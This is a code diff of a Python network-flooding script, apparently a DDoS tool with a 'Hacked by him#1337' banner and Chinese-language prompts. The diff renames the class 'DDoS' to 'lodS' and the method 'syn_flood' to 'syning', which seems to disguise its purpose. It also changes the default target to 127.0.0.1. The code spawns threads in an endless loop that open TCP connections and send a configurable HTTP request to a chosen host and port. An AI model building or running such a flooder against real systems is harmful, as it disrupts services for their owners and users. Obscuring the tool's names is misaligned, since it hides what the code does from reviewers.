@@ -31,7 +31,7 @@ __     ___            _ _
 print(e1)
 print('Hacked by him#1337\nwelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')
 
-class DDoS:
+class lodS:
     def __init__(self, host, port, pack):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -39,7 +39,7 @@ class DDoS:
         self.port = port
         self.pack = pack
     
-    def syn_flood(self):
+    def syning(self):
         print("Connecting...")
         while True:
             
@@ -71,6 +71,7 @@ def input_settings():
             print('输入的不是数字，请重新输入！')
 
 def start():
+    global ip, threads, port, pack
     while True:
         print('\n--------------------------------------------------')
         ask = input('是否要进行配置，如不配置将使用默认值（适用于80端口的本机）\n输入y以确认，输入n取消（使用默认值）：\n')
@@ -80,7 +81,7 @@ def start():
             threads, port, pack = input_settings()
             break
         elif ask.lower() == "n":
-            ip = ''
+            ip = '127.0.0.1'
             threads, port, pack = 100, 80, b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
             break
         else:
@@ -88,11 +89,11 @@ def start():
 
 if __name__ == "__main__":
     start()
-    pressure = DDoS(ip, port, pack)
+    pressure = lodS(ip, port, pack)
     thread_list = []
     while True:  
         for _ in range(threads):
-            t = threading.Thread(target=pressure.syn_flood)
+            t = threading.Thread(target=pressure.syning)
             t.start()
             thread_list.append(t)
          
